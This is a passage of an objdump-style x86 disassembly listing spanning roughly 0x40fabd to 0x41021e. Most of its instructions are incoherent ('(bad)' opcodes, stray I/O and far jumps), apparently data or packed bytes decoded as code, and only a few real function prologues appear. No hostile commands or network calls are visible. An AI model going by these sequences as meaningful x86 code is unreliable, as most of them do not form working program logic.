  40fabd:	rol    DWORD PTR [eax+0xe],0xc8
  40fac1:	jmp    0x597a4fde
  40fac6:	das    
  40fac7:	retf   
  40fac8:	or     eax,0xb5bf3bbd
  40facd:	sub    bl,ch
  40facf:	stc    
  40fad0:	jns    0x40fb0b
  40fad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad3:	pop    eax
  40fad4:	jecxz  0x40faf2
  40fad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fad7:	inc    edi
  40fad8:	(bad)  
  40fad9:	mov    dh,0x3e
  40fadb:	(bad)  
  40fadc:	xchg   ebx,eax
  40fadd:	xchg   edi,eax
  40fade:	sbb    al,0xf8
  40fae0:	inc    esp
  40fae1:	xchg   edx,eax
  40fae2:	fcom   QWORD PTR [ecx]
  40fae4:	imul   eax,edi,0xffffffee
  40fae7:	(bad)  
  40fae9:	enter  0x75d2,0x89
  40faed:	or     al,0x6
  40faef:	and    ch,BYTE PTR ds:0xdeaea876
  40faf5:	ss mov ah,0x38
  40faf8:	pop    esi
  40faf9:	mov    eax,0x553775c6
  40fafe:	pushf  
  40faff:	inc    eax
  40fb00:	dec    esi
  40fb01:	test   al,0x91
  40fb03:	mov    esp,0x4f1b67dd
  40fb08:	adc    ebp,DWORD PTR [ebx-0x31]
  40fb0b:	or     BYTE PTR [eax],bh
  40fb0d:	aam    0x7e
  40fb0f:	mul    DWORD PTR [eax+0x4b]
  40fb12:	mov    esp,0xb2b2d44a
  40fb17:	xor    BYTE PTR [edi],dh
  40fb19:	jnp    0x40fb1d
  40fb1b:	pop    eax
  40fb1c:	dec    edi
  40fb1d:	mov    eax,0x558d6a53
  40fb22:	xor    DWORD PTR [ebp+0x5060f932],0xffffff88
  40fb29:	xchg   ebp,eax
  40fb2a:	inc    ebp
  40fb2b:	ror    DWORD PTR [edx+0x3bdde899],0x29
  40fb32:	mov    edx,DWORD PTR [esi]
  40fb34:	xchg   ebx,eax
  40fb35:	jne    0x40fae9
  40fb37:	aas    
  40fb38:	or     dh,BYTE PTR [ecx+0x5cf26f66]
  40fb3e:	dec    esp
  40fb3f:	or     al,0x1a
  40fb41:	adc    BYTE PTR [eax],ah
  40fb43:	sub    al,BYTE PTR ds:0x2de7bf93
  40fb49:	pop    esp
  40fb4a:	mov    eax,ds:0x75d545f0
  40fb4f:	fst    QWORD PTR [eax+ecx*1+0x12]
  40fb53:	shl    DWORD PTR [ebx-0x1387aad],1
  40fb59:	inc    edi
  40fb5a:	push   edx
  40fb5b:	add    al,0x4d
  40fb5d:	(bad)  
  40fb5e:	scas   eax,DWORD PTR es:[edi]
  40fb5f:	clc    
  40fb60:	rcl    BYTE PTR [ebx],0xe
  40fb63:	out    0xfe,al
  40fb65:	repnz mov BYTE PTR [edx],cl
  40fb68:	xchg   esp,eax
  40fb69:	xor    BYTE PTR [edi-0xdefce1c],dh
  40fb6f:	mov    WORD PTR [eax-0x20707705],es
  40fb75:	mov    BYTE PTR [ebx+0x180e8894],dh
  40fb7b:	jmp    0xbccb2aba
  40fb80:	mov    bl,0xb8
  40fb82:	xchg   BYTE PTR [edx+0x19013326],dl
  40fb88:	rol    esp,0x45
  40fb8b:	add    BYTE PTR gs:[ebx+ecx*1+0x1e],al
  40fb90:	shr    BYTE PTR [eax+0x515ec9ac],0x3d
  40fb97:	pop    edx
  40fb98:	pop    esp
  40fb99:	push   esi
  40fb9a:	mov    bh,0x77
  40fb9c:	imul   BYTE PTR [edi+0x13]
  40fb9f:	xor    eax,0x860f7820
  40fba4:	jns    0x40fb9f
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffff87
  40fbc9:	jne    0x40fb4b
  40fbcb:	xchg   esi,eax
  40fbcc:	shl    BYTE PTR [esi+0x7d7c7e7e],1
  40fbd2:	jle    0x40fc52
  40fbd4:	push   es
  40fbd5:	inc    ebx
  40fbd6:	retf   0x5d38
  40fbd9:	div    BYTE PTR [esi]
  40fbdb:	lock mov dl,0xbd
  40fbde:	mov    ecx,0x320c056a
  40fbe3:	push   cs
  40fbe4:	mov    es,WORD PTR [ebp+0x3fa1c736]
  40fbea:	iret   
  40fbeb:	push   ecx
  40fbec:	push   ds
  40fbed:	icebp  
  40fbee:	test   ah,bh
  40fbf0:	test   DWORD PTR [ebx-0x31],eax
  40fbf3:	mov    ch,0x8b
  40fbf5:	pand   mm6,QWORD PTR [edi-0x27127850]
  40fbfc:	bnd jmp 0x40fbb8
  40fbff:	mov    cl,BYTE PTR [edi]
  40fc01:	(bad)  
  40fc02:	int3   
  40fc03:	sar    BYTE PTR [eax+0x43742127],cl
  40fc09:	aas    
  40fc0a:	call   0xf3ca0674
  40fc0f:	ins    BYTE PTR es:[edi],dx
  40fc10:	jbe    0x40fbca
  40fc12:	dec    edx
  40fc13:	mov    ebx,edx
  40fc15:	or     al,0xb3
  40fc17:	xchg   esi,eax
  40fc18:	lods   eax,DWORD PTR ds:[esi]
  40fc19:	xchg   ebp,eax
  40fc1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc1b:	std    
  40fc1c:	icebp  
  40fc1d:	mov    edx,esp
  40fc1f:	mov    BYTE PTR [edx],bl
  40fc21:	pushf  
  40fc22:	jecxz  0x40fc26
  40fc24:	outs   dx,BYTE PTR ds:[esi]
  40fc25:	inc    edx
  40fc26:	inc    eax
  40fc27:	push   edx
  40fc28:	adc    DWORD PTR [edi+ebp*8],edi
  40fc2b:	mov    ch,0x13
  40fc2d:	push   edi
  40fc2e:	mov    al,0x41
  40fc30:	ss mov bl,0xfd
  40fc33:	adc    BYTE PTR [esi+0x1785eb6],bl
  40fc39:	adc    dh,dh
  40fc3b:	and    al,0xa2
  40fc3d:	inc    DWORD PTR [ebp+0xa9e1c0]
  40fc43:	lock xor ah,BYTE PTR [edi]
  40fc46:	(bad)  
  40fc48:	adc    esi,DWORD PTR es:[ebp-0xc]
  40fc4c:	jle    0x40fcb9
  40fc4e:	adc    dh,BYTE PTR [ebx+0x4a]
  40fc51:	ror    ah,0xd4
  40fc54:	mov    eax,ds:0x688981a1
  40fc59:	sti    
  40fc5a:	dec    esp
  40fc5b:	pop    edi
  40fc5c:	mov    edx,0x4b9a9e4a
  40fc61:	cmp    BYTE PTR [ebx-0x575dcb53],ah
  40fc67:	mov    bl,0x6c
  40fc69:	cs mov ch,0xda
  40fc6c:	mov    BYTE PTR [ebx],cl
  40fc6e:	sub    dh,BYTE PTR [ebx-0x56]
  40fc71:	sbb    dh,BYTE PTR [eax-0x2788d2fb]
  40fc77:	sbb    DWORD PTR [edx-0x73],eax
  40fc7a:	js     0x40fce8
  40fc7c:	shl    DWORD PTR [esi+eax*4+0x2c7ac1e],0xd9
  40fc84:	rol    BYTE PTR [edx],1
  40fc86:	ds aaa 
  40fc88:	jnp    0x40fc7f
  40fc8a:	xchg   esi,eax
  40fc8b:	repnz inc ebp
  40fc8d:	adc    DWORD PTR [edi+0x39b281e9],0x1e
  40fc94:	push   cs
  40fc95:	sub    BYTE PTR [eax+0x79],cl
  40fc98:	dec    edi
  40fc99:	dec    edi
  40fc9a:	es inc ebx
  40fc9c:	fwait
  40fc9d:	xchg   ebx,eax
  40fc9e:	adc    DWORD PTR [eax],edx
  40fca0:	sbb    eax,0xc330f8bc
  40fca5:	popf   
  40fca6:	push   0xb291db2f
  40fcab:	mov    esi,0x5b2f4974
  40fcb0:	cmp    DWORD PTR [ecx-0x49d8dd0b],edx
  40fcb6:	pop    ebx
  40fcb7:	bound  edi,QWORD PTR [ebp-0x16]
  40fcba:	mov    ds,WORD PTR [eax+0x1d075078]
  40fcc0:	mov    ah,0x2b
  40fcc2:	jp     0x40fd35
  40fcc4:	outs   dx,DWORD PTR ds:[esi]
  40fcc5:	stos   BYTE PTR es:[edi],al
  40fcc6:	jle    0x40fd12
  40fcc8:	xor    al,0xfb
  40fcca:	nop
  40fccb:	pop    ecx
  40fccc:	dec    ecx
  40fccd:	sbb    eax,0x45e27228
  40fcd2:	jle    0x40fc97
  40fcd4:	aaa    
  40fcd5:	push   ecx
  40fcd6:	inc    edi
  40fcd7:	xchg   edx,eax
  40fcd8:	dec    ebx
  40fcd9:	adc    DWORD PTR [esi+esi*1+0x10],edx
  40fcdd:	lock mul dh
  40fce0:	fcomip st,st(5)
  40fce2:	cmp    al,0x19
  40fce4:	outs   dx,DWORD PTR ds:[esi]
  40fce5:	gs jge 0x40fc82
  40fce8:	mov    ebx,0xb01524d9
  40fced:	imul   ebx,DWORD PTR [esi],0x47a518e
  40fcf3:	pop    edi
  40fcf4:	cmp    eax,DWORD PTR [eax+0x6]
  40fcf7:	xchg   edi,eax
  40fcf8:	add    al,0x7d
  40fcfa:	xor    bp,WORD PTR [eax]
  40fcfd:	gs pop eax
  40fcff:	cmp    esi,DWORD PTR [ebx+0x538c91f2]
  40fd05:	(bad)  
  40fd06:	push   edi
  40fd07:	pushf  
  40fd08:	pop    esp
  40fd09:	imul   ebx,esp,0x24
  40fd0c:	sub    edi,esi
  40fd0e:	or     BYTE PTR [ecx],cl
  40fd10:	enter  0x5e41,0x6d
  40fd14:	pop    es
  40fd15:	popf   
  40fd16:	fild   QWORD PTR [edi+0x2c]
  40fd19:	ds pushaw 
  40fd1c:	scas   al,BYTE PTR es:[edi]
  40fd1d:	xchg   ebp,eax
  40fd1e:	int3   
  40fd1f:	pop    ebp
  40fd20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd21:	rol    BYTE PTR ds:0xb19e7972,cl
  40fd27:	hlt    
  40fd28:	sub    bh,BYTE PTR [ecx-0x1e]
  40fd2b:	or     BYTE PTR [edi+0x510236c7],al
  40fd31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd32:	fucomi st,st(4)
  40fd34:	mov    BYTE PTR [ebx-0x19],bl
  40fd37:	inc    ebp
  40fd38:	ja     0x40fd1e
  40fd3a:	adc    BYTE PTR [ebx+eax*4+0x2b2ec2a],ch
  40fd41:	mov    eax,0xd97b7d1e
  40fd46:	pop    edi
  40fd47:	push   edi
  40fd48:	xor    DWORD PTR [eax-0x60b83ff4],0x86ffca56
  40fd52:	sahf   
  40fd53:	jns    0x40fd6f
  40fd55:	xlat   BYTE PTR ds:[ebx]
  40fd56:	loopne 0x40fd1b
  40fd58:	jbe    0x40fdcd
  40fd5a:	dec    esp
  40fd5b:	adc    dl,BYTE PTR [edi+0x702d4fa6]
  40fd61:	repz fdiv QWORD PTR ss:[eax+0x31]
  40fd66:	das    
  40fd67:	pop    edi
  40fd68:	(bad)  
  40fd69:	xchg   esp,eax
  40fd6a:	leave  
  40fd6b:	sbb    cl,bh
  40fd6d:	adc    DWORD PTR [ecx],0x55
  40fd70:	push   edi
  40fd71:	pop    ss
  40fd72:	mov    ebp,0x4f9aa937
  40fd77:	(bad)  
  40fd78:	pop    esi
  40fd79:	test   dl,ch
  40fd7b:	xchg   esi,eax
  40fd7c:	hlt    
  40fd7d:	ret    
  40fd7e:	stc    
  40fd7f:	lods   eax,DWORD PTR ds:[esi]
  40fd80:	bound  ecx,QWORD PTR [esi+0xe]
  40fd83:	(bad)  
  40fd84:	(bad)  
  40fd85:	xlat   BYTE PTR ds:[ebx]
  40fd86:	push   ds
  40fd87:	scas   eax,DWORD PTR es:[edi]
  40fd88:	push   0x17
  40fd8a:	rcr    edx,1
  40fd8c:	and    al,BYTE PTR [esi-0x427107cf]
  40fd92:	sar    bl,cl
  40fd94:	xchg   ecx,eax
  40fd95:	dec    edi
  40fd96:	jns    0x40fd9e
  40fd98:	inc    esi
  40fd99:	repz not DWORD PTR [ecx+0x25092bf6]
  40fda0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fda1:	inc    esp
  40fda2:	psrlw  mm7,QWORD PTR ds:0x839da189
  40fda9:	mov    ss,WORD PTR [eax+0x7a37381c]
  40fdaf:	add    BYTE PTR [ecx-0x27],ah
  40fdb2:	mov    bh,0x1a
  40fdb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdb5:	fs pop ss
  40fdb7:	mov    BYTE PTR [ecx+0x7f0dd551],dh
  40fdbd:	fisub  DWORD PTR [ebx]
  40fdbf:	mov    ah,0xaf
  40fdc1:	adc    DWORD PTR [eax],esi
  40fdc3:	jbe    0x40fd6b
  40fdc5:	xchg   DWORD PTR [edi-0x5c],ecx
  40fdc8:	cdq    
  40fdc9:	dec    ecx
  40fdca:	lea    ebx,[edx+0x59]
  40fdcd:	or     bl,cl
  40fdcf:	xchg   esp,eax
  40fdd0:	lea    ebp,[edi-0x6d]
  40fdd3:	aas    
  40fdd4:	jns    0x40fd5f
  40fdd6:	push   0xffffff96
  40fdd8:	jl     0x40fd7b
  40fdda:	gs mov eax,0x63706e27
  40fde0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fde1:	xor    edi,eax
  40fde3:	out    0x64,al
  40fde5:	std    
  40fde6:	push   ebp
  40fde7:	ja     0x40fd71
  40fde9:	in     al,dx
  40fdea:	mov    dl,BYTE PTR [eax+ebp*1-0x3f57cdf2]
  40fdf1:	je     0x40fdd7
  40fdf3:	mov    ecx,0x3e359963
  40fdf8:	out    dx,eax
  40fdf9:	xor    ch,BYTE PTR [ebx+0x7a]
  40fdfc:	lds    eax,FWORD PTR [eax+0x5a]
  40fdff:	mov    esi,0xc32b773
  40fe04:	es jmp 0x978e:0xf950cd55
  40fe0c:	jae    0x40fdf0
  40fe0e:	in     eax,0x6b
  40fe10:	xchg   DWORD PTR [eax-0x5],edx
  40fe13:	jno    0x40fdf0
  40fe15:	test   BYTE PTR [eax+0x46],0x33
  40fe19:	inc    esp
  40fe1a:	pushf  
  40fe1b:	inc    ecx
  40fe1c:	hlt    
  40fe1d:	ret    0x4517
  40fe20:	jecxz  0x40fe31
  40fe22:	mov    esp,0xd1a47da3
  40fe27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe28:	inc    ecx
  40fe29:	lods   eax,DWORD PTR ds:[esi]
  40fe2a:	call   0xdfb26075
  40fe2f:	jne    0x40fe11
  40fe31:	ret    
  40fe32:	stos   DWORD PTR es:[edi],eax
  40fe33:	dec    ebx
  40fe34:	stos   DWORD PTR es:[edi],eax
  40fe35:	stos   DWORD PTR es:[edi],eax
  40fe36:	jge    0x40fdcf
  40fe38:	xchg   edi,eax
  40fe39:	(bad)  
  40fe3a:	mov    dl,0x33
  40fe3c:	pop    ebp
  40fe3d:	jb     0x40fe1c
  40fe3f:	test   eax,0xcedf309
  40fe44:	dec    eax
  40fe45:	jge    0x40fdd1
  40fe47:	dec    ebp
  40fe48:	push   ebp
  40fe49:	loop   0x40fde4
  40fe4b:	mov    cl,0xf0
  40fe4d:	outs   dx,DWORD PTR ds:[esi]
  40fe4e:	or     ecx,DWORD PTR [eax]
  40fe50:	jle    0x40fe25
  40fe52:	sbb    al,0x4f
  40fe54:	pushf  
  40fe55:	stos   DWORD PTR es:[edi],eax
  40fe56:	ja     0x40fe4f
  40fe58:	inc    ebp
  40fe59:	mov    cl,0x0
  40fe5b:	sbb    ecx,DWORD PTR [ecx+0x5ecebd14]
  40fe61:	mov    dl,0x72
  40fe63:	das    
  40fe64:	cmp    dl,BYTE PTR [edi]
  40fe66:	pop    ss
  40fe67:	mov    ebp,0x994b6787
  40fe6c:	mov    cl,0xeb
  40fe6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe6f:	sub    BYTE PTR [esi+0x57],bh
  40fe72:	cmp    edi,edx
  40fe74:	xchg   esi,eax
  40fe75:	and    eax,ebp
  40fe77:	cmc    
  40fe78:	ja     0x40fe6c
  40fe7a:	scas   al,BYTE PTR es:[edi]
  40fe7b:	ss mov bl,0x66
  40fe7e:	cmc    
  40fe7f:	repnz sbb eax,0xa847c79a
  40fe85:	inc    ecx
  40fe86:	or     eax,0x226c7054
  40fe8b:	xchg   BYTE PTR [ecx+eax*1+0x50],dl
  40fe8f:	dec    eax
  40fe90:	lds    esp,FWORD PTR [esi]
  40fe92:	adc    cl,BYTE PTR [ecx-0x26263c2e]
  40fe98:	mul    esp
  40fe9a:	pushf  
  40fe9b:	stos   DWORD PTR es:[edi],eax
  40fe9c:	imul   ebp,DWORD PTR [edx+0x51],0x12
  40fea0:	in     al,0xfb
  40fea2:	push   ebx
  40fea3:	jmp    0x40ff0a
  40fea5:	push   ds
  40fea6:	dec    ebp
  40fea7:	test   BYTE PTR [ecx-0x50f155a1],dh
  40fead:	push   ebp
  40feae:	xchg   edi,eax
  40feaf:	outs   dx,BYTE PTR ds:[esi]
  40feb0:	sahf   
  40feb1:	loop   0x40ff1c
  40feb3:	mov    ah,0x77
  40feb5:	jae    0x40fef6
  40feb7:	jnp    0x40ff1d
  40feb9:	push   0x269ec3d
  40febe:	mov    edi,0x7fcf4f7c
  40fec3:	mov    al,BYTE PTR [edi-0x79d7fb21]
  40fec9:	cs sbb al,al
  40fecc:	pop    esp
  40fecd:	lock sub dh,BYTE PTR [esi+ecx*4-0x654cc245]
  40fed5:	add    ecx,DWORD PTR [ebx-0x2dccf3bb]
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x59c14346
  40fef3:	mov    ch,BYTE PTR [ebx+0x7e7eb5de]
  40fef9:	jl     0x40ff78
  40fefb:	jle    0x40ff7b
  40fefd:	ret    0x8677
  40ff00:	lds    ecx,FWORD PTR [edi+0x39db6ab]
  40ff06:	jo     0x40ff03
  40ff08:	mov    esi,eax
  40ff0a:	and    eax,0x8093e21a
  40ff0f:	popa   
  40ff10:	jae    0x40ff25
  40ff12:	sbb    dl,cl
  40ff14:	jno    0x40fecf
  40ff16:	pop    es
  40ff17:	fimul  WORD PTR [eax+0x4fa8c33d]
  40ff1d:	mov    eax,0xc01c4725
  40ff22:	ret    
  40ff23:	aaa    
  40ff24:	lea    ebp,[edi]
  40ff26:	inc    esi
  40ff27:	lea    ecx,[edi+0x3b88809f]
  40ff2d:	push   eax
  40ff2e:	in     al,dx
  40ff2f:	inc    esi
  40ff30:	dec    eax
  40ff31:	pop    esi
  40ff32:	call   0x91b0:0x1e09e420
  40ff39:	sbb    ebp,DWORD PTR [ebx]
  40ff3b:	fnstsw WORD PTR [eax-0x56]
  40ff3e:	mov    edi,0x3f6ccf81
  40ff43:	inc    edi
  40ff44:	mov    DWORD PTR [edx+0x76],ebx
  40ff47:	out    0x32,eax
  40ff49:	jo     0x40ff2e
  40ff4b:	sub    DWORD PTR [edx+0x72],0xf6e7d3f7
  40ff52:	xor    al,0x5e
  40ff54:	scas   al,BYTE PTR es:[edi]
  40ff55:	sbb    eax,0x384e5fe9
  40ff5a:	jg     0x40fef5
  40ff5c:	mov    ebx,0x13d8eb43
  40ff61:	inc    eax
  40ff62:	mov    eax,0x4c6fc6fd
  40ff67:	inc    edi
  40ff68:	pop    esi
  40ff69:	cmp    ecx,DWORD PTR [edx+0x48]
  40ff6c:	xchg   esi,eax
  40ff6d:	gs xchg esp,eax
  40ff6f:	mov    dh,0xfe
  40ff71:	dec    ebx
  40ff72:	lds    edi,FWORD PTR [edx+0x398be265]
  40ff78:	test   al,0xfa
  40ff7a:	stos   DWORD PTR es:[edi],eax
  40ff7b:	mov    edx,0x6687347f
  40ff80:	dec    esi
  40ff81:	ins    DWORD PTR es:[edi],dx
  40ff82:	mov    cl,0xab
  40ff84:	inc    edx
  40ff85:	mov    edi,0x58dfb4b2
  40ff8a:	xchg   ebp,eax
  40ff8b:	out    0xb5,eax
  40ff8d:	xor    esi,ebx
  40ff8f:	test   BYTE PTR [edx+eiz*2],bl
  40ff92:	in     al,dx
  40ff93:	scas   al,BYTE PTR es:[edi]
  40ff94:	xchg   edx,eax
  40ff95:	imul   ecx,DWORD PTR [esi],0xffffffb8
  40ff98:	loopne 0x40ff8b
  40ff9a:	fwait
  40ff9b:	mov    al,ds:0xe7091dd1
  40ffa0:	pop    eax
  40ffa1:	xor    DWORD PTR [ebp+0x1a],ebx
  40ffa4:	repz and edx,DWORD PTR [ecx+0x41424b1a]
  40ffab:	dec    esi
  40ffac:	or     al,0x6a
  40ffae:	dec    esi
  40ffaf:	mov    eax,0xb0a449ad
  40ffb4:	push   edx
  40ffb5:	adc    eax,0x2f2cfbfc
  40ffba:	xor    DWORD PTR [ecx+0x7afa843f],eax
  40ffc0:	add    al,0x2
  40ffc2:	aam    0xd0
  40ffc4:	out    dx,eax
  40ffc5:	cmp    eax,0x15fbfee
  40ffca:	pop    esp
  40ffcb:	pop    ebp
  40ffcc:	sbb    eax,0x35bfc59c
  40ffd1:	sub    eax,DWORD PTR [edi]
  40ffd3:	mov    esp,ds
  40ffd5:	jmp    FWORD PTR [edx+0x49]
  40ffd8:	(bad)
  40ffdb:	add    cl,al
  40ffdd:	cwde   
  40ffde:	mul    DWORD PTR [ebx+ebp*1-0x134aaaaa]
  40ffe5:	inc    esi
  40ffe6:	outs   dx,DWORD PTR ds:[esi]
  40ffe7:	xchg   dl,ch
  40ffe9:	(bad)  [esi+0x1f]
  40ffec:	stos   DWORD PTR es:[edi],eax
  40ffed:	push   es
  40ffee:	popa   
  40ffef:	mov    WORD PTR [esp+ebx*1+0x5d0f0a7],es
  40fff6:	mov    esp,0x2fd92a73
  40fffb:	xchg   ebx,eax
  40fffc:	xchg   edx,eax
  40fffd:	mov    BYTE PTR [eax+0x73d40e35],dl
  410003:	inc    esi
  410004:	loope  0x41004f
  410006:	mov    eax,0x286914c5
  41000b:	mov    dl,0x7e
  41000d:	(bad)  
  41000e:	test   al,0x8b
  410010:	repz mov bl,dl
  410013:	femms  
  410015:	enter  0x4941,0x18
  410019:	pop    esi
  41001a:	lods   eax,DWORD PTR ds:[esi]
  41001b:	lods   eax,DWORD PTR ds:[esi]
  41001c:	je     0x410017
  41001e:	data16 jo 0x410041
  410021:	ins    BYTE PTR es:[edi],dx
  410022:	loopne 0x410050
  410024:	jno    0x410060
  410026:	mov    ds:0x8b080404,eax
  41002b:	cmp    bl,BYTE PTR [eax]
  41002d:	adc    DWORD PTR [esi-0x73],0x3b
  410031:	mov    ecx,0xd5c81ad1
  410036:	jo     0x41002a
  410038:	mov    bl,0xc6
  41003a:	dec    edi
  41003b:	xchg   edx,eax
  41003c:	pop    edx
  41003d:	or     esp,edx
  41003f:	cmp    BYTE PTR [ecx-0xf],ch
  410042:	xor    edi,DWORD PTR [edx]
  410044:	dec    ebx
  410045:	cmp    ah,dh
  410047:	xchg   edx,eax
  410048:	sbb    al,0x46
  41004a:	inc    ebx
  41004b:	ffreep st(2)
  41004d:	je     0x4100bf
  41004f:	aaa    
  410050:	ss jne 0x4100b3
  410053:	dec    esp
  410054:	int3   
  410055:	cwde   
  410056:	inc    edx
  410057:	(bad)
  41005a:	push   edx
  41005b:	clc    
  41005c:	and    DWORD PTR [edx+ebx*4-0x26035293],eax
  410063:	xor    DWORD PTR [ecx+0x30],esp
  410066:	xchg   esi,eax
  410067:	push   0x8a0fecad
  41006c:	cmc    
  41006d:	or     dl,BYTE PTR [esi+esi*8]
  410070:	add    edi,DWORD PTR [edi+0x79]
  410073:	sbb    eax,0x1d08024e
  410078:	push   0x4f
  41007a:	mov    eax,ds:0xdbac4e03
  41007f:	and    bh,BYTE PTR [ecx-0x1b]
  410082:	add    BYTE PTR [edx],0x36
  410085:	std    
  410086:	cli    
  410087:	dec    ecx
  410088:	adc    ch,0xaa
  41008b:	and    esp,ebp
  41008d:	cmp    esi,DWORD PTR [edi+0x23477f24]
  410093:	jno    0x410074
  410095:	add    eax,0x3279acf9
  41009a:	out    dx,eax
  41009b:	data16 jge 0x41007d
  41009e:	push   eax
  41009f:	push   edx
  4100a0:	cmp    al,0x60
  4100a2:	jg     0x410120
  4100a4:	dec    eax
  4100a5:	aaa    
  4100a6:	xor    ebx,edx
  4100a8:	xor    BYTE PTR [esi+ebp*4],ch
  4100ab:	(bad)  
  4100ac:	shl    BYTE PTR [ecx-0x1f],cl
  4100af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100b0:	push   ebp
  4100b1:	and    eax,eax
  4100b3:	jns    0x410045
  4100b5:	fwait
  4100b6:	std    
  4100b7:	retf   
  4100b8:	sbb    esp,DWORD PTR [edi+0x5f]
  4100bb:	xor    ebp,DWORD PTR [edi-0xd]
  4100be:	loopne 0x41011b
  4100c0:	xchg   esp,eax
  4100c1:	nop
  4100c2:	adc    cl,cl
  4100c4:	call   0x7b6a3a6b
  4100c9:	push   ss
  4100ca:	out    dx,al
  4100cb:	add    al,0xff
  4100cd:	fwait
  4100ce:	ds inc edi
  4100d0:	jno    0x41008b
  4100d2:	dec    ecx
  4100d3:	cmc    
  4100d4:	ins    DWORD PTR es:[edi],dx
  4100d5:	clc    
  4100d6:	and    DWORD PTR [edx-0x6d326bf3],0x77
  4100dd:	push   ds
  4100de:	mov    al,0x9f
  4100e0:	xor    eax,0x2093782
  4100e5:	and    cl,BYTE PTR [esp+eax*2+0x6cbd733]
  4100ec:	jmp    0x4100a8
  4100ee:	dec    eax
  4100ef:	sub    eax,0x994f7c6f
  4100f4:	mov    dl,0xc5
  4100f6:	sbb    ecx,ebx
  4100f8:	mov    WORD PTR [edx],fs
  4100fa:	test   BYTE PTR [eax-0x406d823d],dh
  410100:	jb     0x410150
  410102:	xlat   BYTE PTR ds:[ebx]
  410103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410104:	inc    ecx
  410105:	xlat   BYTE PTR es:[ebx]
  410107:	xor    dh,BYTE PTR [ecx]
  410109:	in     al,dx
  41010a:	aam    0x93
  41010c:	pmaddwd mm4,QWORD PTR [eax-0x49]
  410110:	jmp    0x4c130839
  410115:	icebp  
  410116:	push   cs
  410117:	pop    ebp
  410118:	popf   
  410119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41011a:	mov    dl,0xb7
  41011c:	mov    cl,BYTE PTR [ebx]
  41011e:	and    al,0xdc
  410120:	jg     0x41012d
  410122:	in     eax,0x79
  410124:	or     eax,0x51dd3ed2
  410129:	retf   
  41012a:	cld    
  41012b:	fcomp  QWORD PTR [ecx+0x3b]
  41012e:	push   eax
  41012f:	mov    esp,0x72e71d10
  410134:	popa   
  410135:	adc    cl,BYTE PTR fs:[eax+0x24]
  410139:	and    BYTE PTR [ebx+0x64fa768e],bl
  41013f:	(bad)  
  410140:	ins    DWORD PTR es:[edi],dx
  410141:	pop    eax
  410142:	aas    
  410143:	xchg   DWORD PTR [ebx-0x617a3014],ebx
  410149:	or     al,0x18
  41014b:	mov    edi,0xe70d4fd3
  410150:	lahf   
  410151:	clc    
  410152:	dec    esi
  410153:	dec    eax
  410154:	test   DWORD PTR [edi-0x2d],ebx
  410157:	cwde   
  410158:	and    DWORD PTR [esi+eiz*4+0x27],ebx
  41015c:	sub    DWORD PTR [ebx+0x87f22db],edx
  410162:	and    al,0xcc
  410164:	imul   esi,DWORD PTR [edx],0x7da64854
  41016a:	inc    ecx
  41016b:	jne    0x41010a
  41016d:	push   eax
  41016e:	in     al,0x8b
  410170:	in     eax,0xb1
  410172:	mov    ebp,0xc5591473
  410177:	stos   DWORD PTR es:[edi],eax
  410178:	sbb    edx,ecx
  41017a:	jb     0x410146
  41017c:	mov    ds:0x403c8b3a,eax
  410181:	pushf  
  410182:	call   0x8d43:0xfa3ad7c4
  410189:	sub    edx,DWORD PTR [ecx*2-0x540e4ff8]
  410190:	int3   
  410191:	mov    ebp,0x72cf3e12
  410196:	call   0x4e896050
  41019b:	xor    DWORD PTR [edi+ecx*8-0x27b42f62],edx
  4101a2:	sbb    al,0xcd
  4101a4:	cmp    BYTE PTR [edi-0x1dc592bd],al
  4101aa:	call   0x5c581041
  4101af:	pop    esi
  4101b0:	shl    DWORD PTR [edi+ebx*4-0x57],1
  4101b4:	add    bh,BYTE PTR [ebx-0x13cf5ac0]
  4101ba:	test   al,0x3c
  4101bc:	loop   0x4101aa
  4101be:	out    0x8f,eax
  4101c0:	dec    ebx
  4101c1:	jne    0x410230
  4101c3:	retf   
  4101c4:	pop    esp
  4101c5:	mov    es,ebx
  4101c7:	mov    esp,0xab674932
  4101cc:	(bad)  
  4101cd:	xor    al,0x50
  4101cf:	into   
  4101d0:	lea    esi,[ebp-0x4e]
  4101d3:	ficomp WORD PTR [ebp-0x712eb439]
  4101d9:	or     eax,0xc8c70f7e
  4101de:	and    al,0x81
  4101e0:	add    bl,BYTE PTR [eax+0x2db551a7]
  4101e6:	(bad)  [esp+edi*8+0x480f8a0c]
  4101ed:	popaw  
  4101ef:	and    DWORD PTR [esp+edx*8+0x36],eax
  4101f3:	sbb    eax,0x933c925f
  4101f8:	mov    BYTE PTR [ecx],cl
  4101fa:	es push ebp
  4101fc:	mov    al,0x90
  4101fe:	popa   
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43381f
  41021e:	adc    DWORD PTR ds:0x433857,ecx
